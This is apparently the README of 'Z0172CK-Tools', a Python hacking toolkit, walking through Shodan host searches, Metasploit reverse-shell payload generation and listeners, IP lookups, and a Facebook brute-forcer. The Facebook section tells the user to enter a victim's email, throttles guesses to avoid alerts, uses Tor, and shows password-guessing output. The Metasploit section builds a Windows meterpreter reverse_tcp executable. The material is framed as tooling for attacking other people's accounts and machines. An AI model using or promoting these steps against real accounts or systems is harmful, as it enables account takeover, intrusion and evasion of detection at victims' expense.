---
description: Version Basic
---

# Z0172CK-Tools

Documentation [https://app.gitbook.com/@erik172/s/z0172ck-tools](https://app.gitbook.com/@erik172/s/z0172ck-tools)

{% hint style="info" %}
Z0172CK Tools can receive Updates
{% endhint %}

## Install Z0172CK Tools

### Install on Kali Linux

We must first have Python3 and PIP3

```text
$ sudo apt install python3 python3-pip
```

{% hint style="info" %}
Z0172CK-Tools only works with python 3
{% endhint %}

We clone the repository from github [https://github.com/Erik172/Z0172CK-Tools](https://github.com/Erik172/Z0172CK-Tools)

```bash
$ git clone https://github.com/Erick172/Z0172CK-Tools
```

Install the dependencies found in the requirements.txt file

```bash
$ bash ./install.sh
```

```bash
$ sudo pip3 install -r requirements.txt
```

#### Dependencies to install

* Shodan = 1.23.0
* Colorama = 0.4.3
* Ipinfo = 3.0.0

### Install on Termux

```bash
$ pkg update
```

```bash
$ pkg install python nmap
```

{% hint style="warning" %}
Z0172CK-Tools only works with python 3
{% endhint %}

We clone the repository from github [https://github.com/Erik172/Z0172CK-Tools](https://github.com/Erik172/Z0172CK-Tools)

```bash
$ git clone https://github.com/Erick172/Z0172CK-Tools
```

```bash
$ pip install -r requirements.txt
```

## How to use

already installed the dependencies we can execute the file index.py

```bash
$ python3 index.py
```

```bash
    ███████╗ ██████╗  ██╗███████╗██████╗  ██████╗██╗  ██╗             
    ╚══███╔╝██╔═████╗███║╚════██║╚════██╗██╔════╝██║ ██╔╝             
      ███╔╝ ██║██╔██║╚██║    ██╔╝ █████╔╝██║     █████╔╝              
     ███╔╝  ████╔╝██║ ██║   ██╔╝ ██╔═══╝ ██║     ██╔═██╗              
    ███████╗╚██████╔╝ ██║   ██║  ███████╗╚██████╗██║  ██╗             
    ╚══════╝ ╚═════╝  ╚═╝   ╚═╝  ╚══════╝ ╚═════╝╚═╝  ╚═╝             
            V1.0  Basic                                 By -Erick172  


[01] Shodan        [06] Scan                                                           
[02] Metasploit    [07] Search Enginare                                                   
[03] IP Info
[04] Brute Force    

[88] Update                                                           
[99] Exit                                                             

 Z0172CK >
```

### Shodan

Shodan is a search engine that allows the user to find the same or different specific types of equipment connected to the Internet through a variety of filters.

in order to use shodan we need a KEY API.

For our API KEY we enter [https://account.shodan.io/](https://account.shodan.io/)

```bash
Go to https://account.shodan.io/ to see your API                      
enter your Shodan API:
```

Once our API KEY is entered, it will be saved in the APIs folder and in the Shodan.txt file. If we want to change the API we will have to change it from the Shodan.txt file that remains in the /APIs/Shodan.txt path

```bash
Go to https://account.shodan.io/ to see your API                      
enter your Shodan API:
```

```bash
Z0172CK (Shodan) Search >
```

Here we can start using the shodan tool

#### Example

```bash
Z0172CK (Shodan) Search > apache2
```

then it asks us if we want to see the vulnerabilities too

But I will say no

```bash
You want to see the vulnerabilities y/N > n
```

then it will give us the result of all the computers connected to the internet that use apache2

```bash
[!] Resoult found: 10397 

[+] IP: 189.109.49.138                                                                                                                                               
[+] ISP: Vivo                                                                                                                                                        
[+] Location: {                                                                                                                                                      
  "area_code": null,                                                                                                                                                 
  "city": "S\u00e3o Paulo",                                                                                                                                          
  "country_code": "BR",                                                                                                                                              
  "country_code3": null,                                                                                                                                             
  "country_name": "Brazil",                                                                                                                                          
  "dma_code": null,                                                                                                                                                  
  "latitude": -23.63,                                                                                                                                                
  "longitude": -46.6322,                                                                                                                                             
  "postal_code": null,                                                                                                                                               
  "region_code": "SP"                                                                                                                                                
}                                                                                                                                                                    
[+] Organization: Vivo                                                                                                                                               
[+] Operating System: None                                                                                                                                           
[+] Port: 8089                                                                                                                                                       
[+] Product: null                                                                                                                                                    
[+] Version: null                                                                                                                                                    

[+] IP: 86.107.98.92                                                                                                                                                 
[+] ISP: Netsons s.r.l.                                                                                                                                              
[+] Location: {                                                                                                                                                      
  "area_code": null,                                                                                                                                                 
  "city": "Pescara",                                                                                                                                                 
  "country_code": "IT",                                                                                                                                              
  "country_code3": null,                                                                                                                                             
  "country_name": "Italy",                                                                                                                                           
  "dma_code": null,                                                                                                                                                  
  "latitude": 42.4584,                                                                                                                                               
  "longitude": 14.2028,                                                                                                                                              
  "postal_code": null,                                                                                                                                               
  "region_code": "65"                                                                                                                                                
}                                                                                                                                                                    
[+] Organization: Netsons s.r.l.                                                                                                                                     
[+] Operating System: None                                                                                                                                           
[+] Port: 444                                                                                                                                                        
[+] Product: null                                                                                                                                                    
[+] Version: null 

--more--
```

as we can see in the first line it tells us how many results it found in this case it found 10397

```bash
[!] Resoult found: 10397
```

the results are saved in the result folder

in the case of shodan it would be /result/Shodan.json

[![asciicast](https://asciinema.org/a/349306.svg)](https://asciinema.org/a/349306)

### Metasploit

in the metasploit option, it opens another menu

```bash
[01] Listen Payload
[02] Payload Generate

[99] Back

 Z0172CK (Metasploit) >
```

#### Listen Payload

{% hint style="warning" %}
The MSF option is to connect to Metasploit Not to generate a Payload, nor an automatic attack
{% endhint %}

The MSF option stands for Metasploit Framework, with this option we can connect to metasploit only by placing the payload, port and ip

```bash
 Z0172CK (Metasploit) > 1

Select platform type

[01] Windows
[02] Android
[03] Linux
```

we select the payload platform to connect

```bash
Z0172CK (Metasploit/MSF) > 1

Select the Payload

[01] windows/meterpreter/reverse_tcp
[02] windows/meterpreter/reverse_http
[03] windows/meterpreter/reverse_https
[04] windows/meterpreter/bind_tcp
[05] windows/shell/bind_tcp
[06] windows/shell/reverse_tcp
```

We select the Payload to which we want to connect

```bash
 Z0172CK (Metasploit/MSF) Payload > 4
```

```bash
Z0172CK (Metasploit/MSF) LHOST > 
Z0172CK (Metasploit/MSF) LPORT >
```

then it will ask us for the port and host \(IP\) of the Payload to connect

Then we will connect to the metasploit Framework

#### Payload Generate

{% hint style="info" %}
Not all the Metasploit payloads are there.
{% endhint %}

```bash
                   _______________________________________________________
                  |                                                      |
             /    |                                                      |
            /---, |           P   A  Y  L  O  A  D                       |
       -----# ==| |                     G  E  N  E  R  A  T  E           |
       | :) # ==| |                                                      |
  -----'----#   | |______________________________________________________|
  |)___()  '#   |______====____   \___________________________________|
 [_/,-,"--"------ //,-,  ,-,\|\   |/             //,-,  ,-,  ,-,\  __#Erik172#
   ( 0 )|===******||( 0 )( 0 )||-  o              '( 0 )( 0 )( 0 )||
----'-'--------------'-'--'-'-----------------------'-'--'-'--'-'--------------


Selecione la Plataforma
[01] Windows
[02] Android
```

We select the payload platform

```bash
Z0172CK (Metasploit/PayloadGenerate) > 1
```

```bash
[01] windows/meterpreter/reverse_http                                                                                                                                
[02] windows/meterpreter/reverse_https                                                                                                                               
[03] windows/meterpreter/reverse_tcp                                                                                                                                 
[04] windows/meterpreter/bind_tcp                                                                                                                                    
[05] windows/shell/bind_tcp                                                                                                                                          
[06] windows/shell/reverse_tcp        

Z0172CK (Metasploit/MSF) Payload >
```

We select the payload

```bash
Z0172CK (Metasploit/PayloadGenerate) Payload > 3
```

Then it won't ask for a local ip and a port

```bash
Z0172CK (Metasploit/PayloadGenerate) LHOST >
```

```bash
Z0172CK (Metasploit/PayloadGenerate) LPORT >
```

We put the name of our payload, without the file extension

```bash
Z0172CK (Metasploit/PayloadGenerate) FileName > Payload
```

It will show us where the payload generator is stored

```bash
File saved in output/Payload.exe
```

Then it will ask us if we want to listen to the payload, if we give 's' to be metaplanned to metasploit, and if we give it 'n' it will return us to the main menu

```bash
desea conectarse a Metasploit [y/N] >
```

### IpInfo

With IPinfo, you can pinpoint your users’ locations, customize their experiences, prevent fraud, ensure compliance, and so much more.

{% hint style="info" %}
To be able to use the ipinfo tool you need an API KEY
{% endhint %}

In order to get the api key we need to create an account on the ipinfo website [https://ipinfo.io/signup](https://ipinfo.io/signup)

Once the account is created we can go [https://ipinfo.io/account](https://ipinfo.io/account) to see our token

```bash
Ingresa a https://ipinfo.io/account para ver tu access token                                                                                                                                                                                                                                                                         
Ingresa tu API o Access Token >
```

we enter our api key or token

```bash
    . _  .    .__  .  .  __,--'
      (_)    '/__\ __,--'
    '  .  ' . | o|'     IpInfo
             [IIII]`--.__
              |  |       `--.__
              | :|             `--.__
              |  |                   `--.__
    ._,,.-,.__.'__`.___.,.,.-..,_.,.,.,-._..`--..-.,._.,,._,-,.Erik172


Z0172CK (IP-Info) IP >
```

We enter the ip that we want to search for information

```bash
Z0172CK (IP-Info) IP > 185.199.108.153
```

```bash
[+] IP = 185.199.108.153
[+] City = San Francisco
[+] Country = US
[+] Country Name = United States
[!] Hostname = None
[+] Coordinates = 37.7621,-122.3971
[+] Latitude = 37.7621
[+] Longitude = -122.3971
[+] Organization = AS54113 Fastly
[+] Code Postal = 94107
[+] Region = California
[+] TimeZone = America/Los_Angeles

Results Saved in result/IpInfo.json
```

the results are saved in the result folder in the file IpInfo.json

```bash
Results Saved in result/IpInfo.json
```

[![asciicast](https://asciinema.org/a/349309.svg)](https://asciinema.org/a/349309)

### Brute Force

with the brute force option we can attack sites and protocols using passwords

```bash
                                                         c=====e
                                                            H
   ____________                                         _,,_H__
  (__((__((___()                                       //|     |
 (__((__((___()()_____________________________________// |ERIK |
(__((__((___()()()------------------------------------'  |_____|
      Brute Force V0.1


[01] Facebook

[99] Back

 Z0172CK (BruteForce) >
```

#### Facebook

{% hint style="warning" %}
Only 20 passwords are processed per hour to avoid blocking or awakening an alarm in the victim gutter
{% endhint %}

```bash
Z0172CK (BruteForce) > 1

[01] Start Brute Force
[02] Continue Brute Force

[99] Back

 Z0172CK (BruteForce/Facebook) >
```

in the facebook part we have two options 1. start a new attack 2. continue with an attack

If we select the first option to start a new attack, it will ask us for an email and a list of passwords

at any time we can give ctrl + c to save our attack and continue later with the second option

{% hint style="info" %}
if we get an error of this type " Please, check your TOR Connection! Just type" tor "or" service tor start " " just go back to the facebook option
{% endhint %}

```bash
Z0172CK (BruteForce/Facebook) > 1
Email account:
```

we put the mail of a victim

```bash
Password List (Hit Enter to default list):
```

we put the path of the list of our passwords or we give enter to use the one that comes by default

```bash
Wordlist: modules/FB-BruteForce/passwords.lst (39331)
[*] Press Ctrl + C to stop or save session
Trying pass (1/39331): "password"
Trying pass (2/39331): "12345678"
Trying pass (3/39331): "123456789"
Trying pass (4/39331): "iam123"
Trying pass (5/39331): "baseball"
Trying pass (6/39331): "football"
Trying pass (7/39331): "qwertyuiop"
Trying pass (8/39331): "1234567890"
Trying pass (9/39331): "superman"
Trying pass (10/39331): "1qaz2wsx"
Trying pass (11/39331): "trustno1"
Trying pass (12/39331): "jennifer"
Trying pass (13/39331): "sunshine"
Trying pass (14/39331): "iloveyou"
Trying pass (15/39331): "starwars"
Trying pass (16/39331): "computer"
Trying pass (17/39331): "michelle"
Trying pass (18/39331): "11111111"
Trying pass (19/39331): "princess"
Trying pass (20/39331): "987654321"
[*] Waiting 1 hour, to return at:
```

all 20 passwords have been completed and we have to wait for one or we can give it Ctrl + c to save the attack and use it again in an hour

```bash
Ctrl + c
[*] Waiting a second...

Save session for user correo@correo.com ? [Y/n]:
```

It will ask us if we want to save the session. in this case I give it that if

```bash
Save session for user correo@correo.com ? [Y/n]: Y
```

```bash
Session saved.
Use [11] resume
```

after being saved we can use the attack again until it was

```bash
[01] Start Brute Force
[02] Continue Brute Force

[99] Back

Z0172CK (BruteForce/Facebook) > 2
```

```bash
Z0172CK (BruteForce/Facebook) > 2
Files sessions:
1 : modules/FB-BruteForce/sessions/store.session.correo@correo.com.2020-07-23T1133 (wl: modules/FB-BruteForce/passwords.lst, lastpass: 987654321 )
Choose a session number:
```

we give enter and we can continue with our attack

```bash
1 : modules/FB-BruteForce/sessions/store.session.correo@correo.com.2020-07-23T1133 (wl: modules/FB-BruteForce/passwords.lst, lastpass: 987654321 )
Choose a session number: 
[*] Resuming session for user: 
[*] Wordlist:  modules/FB-BruteForce/passwords.lst
[*] Press Ctrl + C to stop or save session
Trying pass (20/39331): 987654321
Trying pass (21/39331): corvette
Trying pass (22/39331): 1234qwer
Trying pass (23/39331): 88888888
Trying pass (24/39331): q1w2e3r4t5
Trying pass (25/39331): internet
Trying pass (26/39331): samantha
Trying pass (27/39331): whatever
Trying pass (28/39331): maverick
Trying pass (29/39331): steelers
Trying pass (30/39331): mercedes
Trying pass (31/39331): 123123123
Trying pass (32/39331): qwer1234
Trying pass (33/39331): hardcore
Trying pass (34/39331): q1w2e3r4
Trying pass (35/39331): midnight
Trying pass (36/39331): bigdaddy
Trying pass (37/39331): victoria
```

